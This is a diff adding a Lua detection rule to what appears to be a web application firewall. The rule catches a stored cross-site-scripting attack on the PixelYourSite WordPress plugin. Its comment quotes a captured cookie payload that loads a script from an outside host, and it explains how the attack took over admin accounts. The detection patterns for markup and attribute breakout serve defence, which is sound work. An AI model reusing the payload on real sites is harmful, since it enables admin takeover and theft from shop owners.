@@ -4086,6 +4086,87 @@ function _M.detect_cve_litespeed_privesc(cookie)
   return nil
 end
 
+-- [CVE] PixelYourSite / PixelYourSite PRO unauthenticated stored XSS through
+-- the traffic-source cookies. CVE-2026-1844 (PRO <= 12.4.0.2), CVE-2026-1841
+-- (free <= 11.2.0), CVE-2026-109987 (cookie printed unescaped; fixed in free
+-- 11.4.3 / PRO 12.6.8). Exploited on this fleet from 2026-02-13 (the day
+-- 1844 was published) to 2026-10-10: ~100 WooCommerce orders on 16 shops.
+--
+-- Source: the plugin code and the fleet's own captures, not memory. On a
+-- WooCommerce Store API checkout (REST_REQUEST), PRO 12.2.7.1's
+-- class_enrich_order.php stores $_COOKIE['pysTrafficSource'] and
+-- $_COOKIE['pys_landing_page'] raw in the order's pys_enrich_data, and
+-- views/html-order-meta-box.php prints them with no escaping. A bot checkout
+-- carrying
+--   pysTrafficSource="<script src=https://patchstackk.com/fz/x.js></script><!--P1181854187-->"
+-- runs that script in the admin's browser the moment staff open the order; on
+-- tophair.gr (2026-10-06) it uploaded a fake plugin and created two
+-- administrators within 15 seconds. Fixed versions sanitize on store and
+-- esc_html on output; the values they read are the four cookies below.
+--
+-- Fingerprint: one of those cookies whose value, decoded as PHP decodes a
+-- cookie (php_url_decode: %XX and `+`), carries markup (`<` or `>`), or a
+-- double quote followed by an attribute-breakout token (the landing page is
+-- printed inside href="..."). The plugin's own JS stores a URL or a host name
+-- (`google.com`, `direct`, `undefined`), URL-encoded, so a decoded value never
+-- holds `<`, `>` or a quote; a legal quoted cookie value ("google.com") has
+-- the quote but no breakout token. `cookie` is the raw Cookie header; names
+-- are matched the way PHP registers them (leading whitespace dropped, decoded,
+-- php_var_name), lowercased, which over-reads (PHP's names are case-sensitive)
+-- on the safe side. Every pair is checked, not just the first PHP keeps.
+-- All methods: the payload rides on every request of the bot's session.
+--
+-- Second leg, the session: the checkout reads $_SESSION['TrafficSource']
+-- before the cookie, and the plugin fills it from getTrafficSource(), which
+-- returns parse_url($_SERVER['HTTP_REFERER'])['host'] for an external
+-- Referer, unvalidated. A Referer whose host part (after `//`, before the
+-- first `/`, `?` or `#`, past any `user@`) holds `<` or `>` plants the same
+-- payload (REFERER_HOST_MARKUP). Only the host is checked: parse_url never
+-- decodes, a browser never sends a raw `<` there, and markup in a Referer's
+-- path or query (a generic XSS probe) is not this CVE's vector.
+local PYS_COOKIES = {
+  pystrafficsource = true, last_pystrafficsource = true,
+  pys_landing_page = true, last_pys_landing_page = true,
+}
+local function pys_referer_host_markup(headers)
+  local ref = header_string(headers and (headers["referer"] or headers["Referer"]))
+  if ref == "" or not ref:find("[<>]") then return false end
+  local s = ref:find("//", 1, true)
+  if not s then return false end
+  local auth = ref:sub(s + 2):match("^[^/?#]*") or ""
+  auth = auth:match("@([^@]*)$") or auth
+  return auth:find("[<>]") ~= nil
+end
+
+function _M.detect_cve_pixelyoursite_xss(cookie, headers)
+  if pys_referer_host_markup(headers) then return "REFERER_HOST_MARKUP" end
+  if not cookie or cookie == "" then return nil end
+  -- Cheap gate: every target name holds "pys" once decoded; an encoded name
+  -- (%70ys…) still shows a `%`, so only then is the gate skipped.
+  local lc = lower(cookie)
+  if not has(lc, "pys") and not lc:find("%", 1, true) then return nil end
+  for pair in cookie:gmatch("[^;]+") do
+    local eq = pair:find("=", 1, true)
+    if eq then
+      local k = pair:sub(1, eq - 1):gsub("^%s+", "")
+      if k:find("[%%+]") then k = _form_unescape(k) end
+      k = lower(php_var_name(k))
+      if PYS_COOKIES[k] then
+        local v = pair:sub(eq + 1)
+        if v:find("[%%+]") then v = _form_unescape(v) end
+        if v:find("[<>]") then return "COOKIE_MARKUP" end
+        if v:find('"', 1, true) then
+          local vl = lower(v)
+          if vl:find("on%a+%s*=") or has(vl, "javascript:") or vl:find("style%s*=") then
+            return "COOKIE_ATTR_BREAKOUT"
+          end
+        end
+      end
+    end
+  end
+  return nil
+end
+
 -- [CVE] Slider Revolution (revslider) — behavioural virtual-patch for the two
 -- classic UNAUTH exploit shapes. This is deliberately NOT version-specific: the
 -- request shapes below are malicious on ANY version (nothing legitimate reads
